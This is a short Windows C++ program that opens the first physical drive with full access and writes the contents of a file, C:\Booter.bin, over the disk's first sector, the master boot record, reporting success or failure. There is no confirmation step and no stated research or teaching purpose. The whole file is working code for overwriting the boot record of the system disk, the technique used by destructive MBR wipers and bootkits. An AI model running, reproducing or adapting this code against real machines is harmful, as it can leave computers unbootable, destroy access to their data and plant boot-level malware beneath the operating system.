#include "stdafx.h"
#include <windows.h>
#include <conio.h>
#include <stdio.h>

void main() {
	DWORD dw;
	const char* pathToBin = "C:\Booter.bin";
	// It is important to use _T because Visual Studio by default is in Unicode mode. 
	HANDLE drive = CreateFile(_T("\\\\.\\PhysicalDrive0"), GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
	if (drive != INVALID_HANDLE_VALUE) {
		HANDLE binary = CreateFile(_T("C:\Booter.bin"), GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
		if (binary != INVALID_HANDLE_VALUE) {
			DWORD size = GetFileSize(binary, 0);
			if (size > 0) {
				byte *mbr = new byte[size];
				if (ReadFile(binary, mbr, size, &dw, 0)) {
					printf("Binary file successfully read!\n");
					//Writes the bin file to the first boot sector on the drive. 
					if (WriteFile(drive, mbr, size, &dw, 0)) {
						printf("First sector overwritten successfully!\n");
					}
					else
						printf("Fatal error! Cannot override 1st sector!\n");
				}
				else
					printf("Error reading from binary file.\n");
			}
			else
				printf("Invalid binary file.\n");
		}
		else {
			printf("Cannot find the binary file to read from!\n");
		}
		CloseHandle(binary);
	}
	else
		printf("Administrator privileges required!\n");
	CloseHandle(drive);
	_getch();
}